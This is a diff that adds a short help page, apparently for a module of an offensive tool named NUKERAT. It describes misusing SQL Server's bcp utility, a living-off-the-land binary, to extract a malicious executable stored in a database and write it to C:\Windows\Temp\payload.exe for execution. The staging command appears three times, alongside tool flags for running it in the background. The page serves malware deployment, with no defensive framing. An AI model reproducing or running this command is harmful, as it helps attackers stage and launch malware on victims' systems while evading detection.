@@ -1,0 +1,18 @@
+ABOUT
+    Microsoft SQL Server Bulk Copy Program utility for importing and
+    exporting data between SQL Server instances and data files. LOLBAS
+    documents extract malicious executable from database storage to
+    local file system for execution.
+
+USAGE:
+    bcp "SELECT payload_data FROM database.dbo.payloads WHERE id=1" queryout "C:\Windows\Temp\payload.exe" -S localhost -T -c
+
+EXAMPLES:
+    bcp "SELECT payload_data FROM database.dbo.payloads WHERE id=1" queryout "C:\Windows\Temp\payload.exe" -S localhost -T -c
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    bcp "SELECT payload_data FROM database.dbo.payloads WHERE id=1" queryout "C:\Windows\Temp\payload.exe" -S localhost -T -c
